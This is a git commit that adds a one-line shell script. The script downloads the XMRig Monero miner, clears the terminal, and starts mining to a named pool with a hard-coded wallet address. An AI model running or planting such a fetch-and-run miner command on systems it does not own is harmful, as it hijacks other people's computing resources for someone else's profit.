84aa9b6b986899f70cf38465aa3bfeb712fe62f6
egendGame <90172289+egendGame@users.noreply.github.com>
2023-08-09 16:02:09 +0530

    Create conrner.sh

---
+++ conrner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz && tar -zxvf xmrig-6.20.0-linux-x64.tar.gz && cd xmrig-6.20.0 && clear &&./xmrig -o pool.hashvault.pro:80 -u 47zzwpqoGDScD7U9F4x59UCiPX6BQXibah9N4zTXVwvHb5WP2h1pwCzDEmxkdwb4JqUijNRonJ7KCJhcQjMtyz1m44HSYA6 -p miner1 -k --threads=2
